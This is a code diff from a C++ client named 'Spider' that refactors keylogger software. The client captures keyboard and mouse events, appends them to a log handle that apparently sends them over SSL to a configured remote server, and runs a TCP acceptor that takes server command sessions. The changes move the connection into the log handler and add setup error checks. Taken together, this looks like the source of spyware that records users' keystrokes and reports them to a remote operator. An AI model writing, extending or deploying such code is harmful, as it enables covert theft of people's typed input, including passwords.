@@ -22,8 +22,7 @@ namespace spi
     {
     public:
         explicit CSpiderCore(cfg::Config &conf) : _conf(conf),
-                                                  _clientSession(_ctx, _io, conf),
-                                                  _logHandle(fs::path(conf.logDir))
+                                                  _logHandle(conf, _ctx)
         {
             _log(logging::Info) << "Configuring Spider Client" << std::endl;
             _log(logging::Info) << "Using remote server " << conf.address << ":" << conf.port << std::endl;
@@ -44,12 +43,10 @@ namespace spi
         {
             _log(logging::Debug) << "Starting now" << std::endl;
             __setupSigHandlers();
-            __setup();
+            if (!__setup())
+                return false;
             __startAcceptor();
             _keyLogger->run();
-            _clientSession.onConnect(boost::bind(&CSpiderCore::__setupLogHandleConnection,
-                                                 this, net::ErrorPlaceholder));
-            _clientSession.connect();
             _log(logging::Info) << "Client started successfully" << std::endl;
             _io.run();
             return true;
@@ -64,11 +61,6 @@ namespace spi
         void __setupSigHandlers() noexcept
         {
             _io.onTerminationSignals(boost::bind(&CSpiderCore::stop, this));
-        }
-
-        void __setupLogHandleConnection(net::SSLConnection *sslConnection)
-        {
-            _logHandle.setConnection(sslConnection);
         }
 
         void __handleAccept(const ErrorCode &ec)
@@ -94,10 +86,12 @@ namespace spi
             _acc.onAccept(_sess->connection(), boost::bind(&CSpiderCore::__handleAccept, this, net::ErrorPlaceholder));
         }
 
-        void __setup()
+        bool __setup()
         {
             _acc.bind(_conf.portAcceptor);
-            _logHandle.setup();
+            _logHandle.setIOManager(_io);
+            if (!_logHandle.setup())
+                return false;
             _keyLogger->setup();
 
             _keyLogger->onMouseMoveEvent([this](proto::MouseMove &&event) {
@@ -109,16 +103,14 @@ namespace spi
             _keyLogger->onKeyboardEvent([this](proto::KeyEvent &&event) {
                 _logHandle.appendEntry(event);
             });
+            return true;
         }
 
     private:
         cfg::Config _conf;
 
         net::IOManager _io;
-        spi::net::SSLContext _ctx{spi::net::SSLContext::SSLv23};
-
-        ClientSession _clientSession;
-
+        net::SSLContext _ctx{spi::net::SSLContext::SSLv23};
         net::TCPAcceptor _acc{_io};
         ServerCommandSession *_sess{nullptr};
 
